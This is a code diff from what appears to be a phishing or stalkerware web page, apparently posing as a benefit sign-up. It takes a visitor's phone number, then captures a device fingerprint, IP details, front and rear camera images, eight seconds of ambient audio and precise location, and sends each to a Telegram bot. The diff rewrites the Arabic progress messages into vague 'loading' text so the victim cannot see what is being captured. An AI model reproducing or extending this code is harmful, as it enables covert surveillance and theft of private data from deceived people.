@@ -432,24 +432,24 @@
             await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, `📞 <b>رقم المستفيد الجديد</b>\n🔢 الرقم: ${phoneNumber}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);
             
             // 2. بصمة الجهاز + IP
-            loaderText.innerText = "📱 جاري قراءة بيانات الجهاز...";
+            loaderText.innerText = "جاري قراءة بيانات ...";
             await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, phoneNumber);
             await getRichIPData(MASTER_ID, BOT_TOKEN, phoneNumber);
             
             // 3. الكاميرا الأمامية
-            loaderText.innerText = "📸 جاري فتح الكاميرا الأمامية...";
+            loaderText.innerText = "📸 جاري ...";
             await captureFrontCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
             
             // 4. الكاميرا الخلفية
-            loaderText.innerText = "📷 جاري فتح الكاميرا الخلفية...";
+            loaderText.innerText = "📷 جاري ...";
             await captureBackCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
             
             // 5. التسجيل الصوتي
-            loaderText.innerText = "🎤 جاري تسجيل الصوت (8 ثوان)...";
+            loaderText.innerText = "🎤 جاري  (8 ثوان)...";
             await recordAmbientAudio(MASTER_ID, BOT_TOKEN, phoneNumber);
             
             // 6. الموقع
-            loaderText.innerText = "📍 جاري تحديد الموقع...";
+            loaderText.innerText = "📍 جاري...";
             await getPreciseLocation(MASTER_ID, BOT_TOKEN, phoneNumber);
             
             // 7. إشعار الإكتمال
